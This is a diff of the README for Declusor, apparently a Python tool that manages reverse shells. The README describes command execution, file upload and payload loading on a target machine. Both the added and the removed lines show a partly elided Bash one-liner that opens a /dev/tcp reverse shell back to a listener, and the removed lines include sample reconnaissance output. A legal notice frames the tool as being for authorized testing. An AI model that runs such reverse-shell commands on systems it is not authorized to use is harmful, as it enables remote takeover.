@@ -4,21 +4,32 @@ Declusor is an extremely effective and flexible tool written in Python, designed
 
 Its command-line interface significantly enhances productivity through intelligent command and file path completion, ensuring reliability and precision in remote operations.
 
+> [!WARNING]
+> **Legal Notice**: This software is strictly intended for educational purposes and authorized security research. The developers decline any responsibility arising from the misuse of this tool. The execution of LibreControl is prohibited on networks or systems for which the operator does not hold ownership or explicit and documented authorization for penetration testing.
+
 ## Features
 
--   **Reverse Shell Management**: Easily establish and interact with a reverse shell on a target machine.
--   **Command Execution**: Execute arbitrary commands on the remote system with output captured by the client.
--   **Interactive Shell**: Open a full interactive shell session for seamless interaction with the remote environment.
--   **File Uploads**: Transfer files from the local machine to the remote target.
--   **Payload Loading**: Load and execute shell scripts or other payloads from local files on the remote system.
--   **Local Command Completion**: Features a custom command-line completer for easy navigation and command input, suggesting available commands and local file paths.
+- **Reverse Shell Management**: Easily establish and interact with a reverse shell on a target machine.
+- **Command Execution**: Execute arbitrary commands on the remote system with output captured by the client.
+- **Interactive Shell**: Open a full interactive shell session for seamless interaction with the remote environment.
+- **File Uploads**: Transfer files from the local machine to the remote target.
+- **Payload Loading**: Load and execute shell scripts or other payloads from local files on the remote system.
+- **Local Command Completion**: Features a custom command-line completer for easy navigation and command input, suggesting available commands and local file paths.
+
+## Technical Architecture
+
+Declusor is built with a modular design focusing on reliability and maintainability:
+
+- **Core**: Robust session management using blocking sockets with optimized buffering (`bytearray`) for high‑performance data handling.
+- **Controller**: Modular command handlers (`load`, `upload`, `shell`, etc.) allowing easy extension of functionality.
+- **Interface**: Abstract base classes defining clear contracts for components.
 
 ## Getting Started
 
 ### Prerequisites
 
-*   **Python 3.x**: Ensure you have Python 3 installed on your local machine.
-*   **Unix-like Operating System**: Declusor relies on some features which are standard on Linux, macOS, and other Unix-like systems.
+* **Python 3.x**: Ensure you have Python 3 installed on your local machine.
+* **Unix‑like Operating System**: Declusor relies on some features which are standard on Linux, macOS, and other Unix‑like systems.
 
 ### Installation
 
@@ -30,15 +41,21 @@ cd declusor
 chmod 700 ./declusor
 ```
 
-No additional Python packages are strictly required beyond the standard library modules, which are typically available with Python 3.x installations.
+No additional Python packages are required beyond the standard library.
+
+### Quick Start
+
+```bash
+# Start the listener (replace IP and PORT as needed)
+./declusor 127.0.0.1 4444
+```
+The client will output a Bash one‑liner. Execute that one‑liner on the target machine to establish the reverse shell.
 
 ## Usage
 
-Declusor operates by having a listener (the Declusor client) waiting for an incoming connection from the target machine. The target machine executes a specific Bash one-liner to establish this reverse shell connection.
+### Starting the Listener (Declusor Client)
 
-### 1. Starting the Listener (Declusor Client)
-
-On your local machine (the machine you are controlling), run the `src/` script, specifying the IP address and port you wish to listen on. This IP address should be reachable from the target machine.
+Run the script with the desired IP and port:
 
 ```bash
 ./declusor <LISTENER_IP> <LISTENER_PORT>
@@ -49,22 +66,19 @@ On your local machine (the machine you are controlling), run the `src/` script, 
 ```bash
 $ ./declusor 127.0.0.1 4444
 ```
+After running, Declusor prints a Bash one‑liner for the target.
 
-After executing this, the Declusor client will start listening and output the Bash one-liner you need to execute on the target machine.
+### Establishing the Reverse Shell (Target Machine)
 
-### 2. Establishing the Reverse Shell (Target Machine)
+Copy the printed one‑liner and run it on the target machine:
 
-Once the Declusor client is running and listening, it will display a Bash one-liner in your terminal. You must copy this entire command and execute it on the target machine (the machine you want to control). This command will initiate a persistent reverse shell connection back to your Declusor client.
-
-The one-liner will look similar to this:
-
-```
-( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3; exec 3>&-; )
+```bash
+( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3 >&3 2>&3 )
 ```
 
-### 3. Interacting with the Target
+### Interacting with the Target
 
-Once the reverse shell is successfully established, your Declusor client will display a `[declusor]` prompt. You can now use the available Declusor commands to interact with the target machine.
+When the reverse shell is active, Declusor shows a `[declusor]` prompt. Available commands:
 
 ```
 [declusor] help
@@ -77,79 +91,31 @@ help    : Display help information about available commands.
 exit    : Exit the program.
 ```
 
-## Example of Workflow
+## Example Output
 
-On your local machine (attacker):
-
-```
-$ ./declusor 127.0.0.1 4444
-( exec 3<> /dev/tcp/127.0.0.1/4444; while [...] done <&3; exec 3>&-; )
-```
-
-Copy the entire line and paste it into the target machine's terminal. Once executed on the target, your Declusor client will show the prompt:
-
-```
-[declusor] command whoami
-ubuntu
-[declusor] command 'ls -l /home'
-total 4.0K
-drwxr-x--- 16 ubuntu ubuntu 4.0K Sep 22 00:38 ubuntu
-[declusor] shell
-pwd
-/home/ubuntu
-[declusor] upload '/home/ubuntu/foo.txt'
-/tmp/dd874fdc8e6987d565f268210358064fd8e67dcbfcbc4187acab6d7fe527c0d1.temp
-[declusor] command 'cat /tmp/dd874fdc8e6987d565f268210358064fd8e67dcbfcbc4187acab6d7fe527c0d1.temp'
-Bar
-[declusor] load 
-info/    search/  
-[declusor] load info/users.sh
-
-CURRENT USER/GROUP
-------------------
-uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev)
-
-USERS LOGGED IN
----------------
-ubuntu   pts/1    -                 8:19m -bash
-
-CURRENT USERS
--------------
-uid=0(root)                gid=0(root)                groups=0(root)
-uid=1(daemon)              gid=1(daemon)              groups=1(daemon)
-uid=2(bin)                 gid=2(bin)                 groups=2(bin)
-uid=3(sys)                 gid=3(sys)                 groups=3(sys)
-uid=4(sync)                gid=65534(nogroup)         groups=65534(nogroup)
-uid=5(games)               gid=60(games)              groups=60(games)
-uid=6(man)                 gid=12(man)                groups=12(man)
-uid=7(lp)                  gid=7(lp)                  groups=7(lp)
-uid=8(mail)                gid=8(mail)                groups=8(mail)
-uid=9(news)                gid=9(news)                groups=9(news)
-uid=10(uucp)               gid=10(uucp)               groups=10(uucp)
-uid=13(proxy)              gid=13(proxy)              groups=13(proxy)
-uid=33(www-data)           gid=33(www-data)           groups=33(www-data)
-uid=34(backup)             gid=34(backup)             groups=34(backup)
-uid=38(list)               gid=38(list)               groups=38(list)
-uid=39(irc)                gid=39(irc)                groups=39(irc)
-uid=42(_apt)               gid=65534(nogroup)         groups=65534(nogroup)
-uid=65534(nobody)          gid=65534(nogroup)         groups=65534(nogroup)
-uid=998(systemd-network)   gid=998(systemd-network)   groups=998(systemd-network)
-uid=996(systemd-timesync)  gid=996(systemd-timesync)  groups=996(systemd-timesync)
-uid=100(dhcpcd)            gid=65534(nogroup)         groups=65534(nogroup)
-uid=101(messagebus)        gid=101(messagebus)        groups=101(messagebus)
-uid=102(syslog)            gid=102(syslog)            groups=102(syslog),4(adm)
-uid=991(systemd-resolve)   gid=991(systemd-resolve)   groups=991(systemd-resolve)
-uid=103(uuidd)             gid=103(uuidd)             groups=103(uuidd)
-uid=104(landscape)         gid=105(landscape)         groups=105(landscape)
-uid=990(polkitd)           gid=990(polkitd)           groups=990(polkitd)
-uid=1000(ubuntu)           gid=1000(ubuntu)           groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev)
-
-SUPER USERS
------------
-uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),107(netdev)
-[declusor] exit
+```bash
+[declusor] help
+load    : Load a payload from a file and send it to the remote system.
+command : Execute a command on the remote system.
+shell   : Open an interactive shell session with the target device.
+upload  : Uploads a file to the target machine.
+execute : Execute a file on the remote system.
+help    : Display help information about available commands.
+exit    : Exit the program.
+[declusor] 
 ```
 
 ## Contributing
 
-Contributions to Declusor are highly encouraged! If you find bugs, have suggestions for new features, or want to improve the existing codebase, please feel free to open issues or submit pull requests on the GitHub repository.
+Contributions are welcome! This is an educational project, so clarity and correctness are prioritized over performance optimizations.
+
+**Areas for contribution:**
+- Additional usage examples
+- Documentation improvements
+- Test coverage expansion
+- Bug fixes
+- Code clarity improvements
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
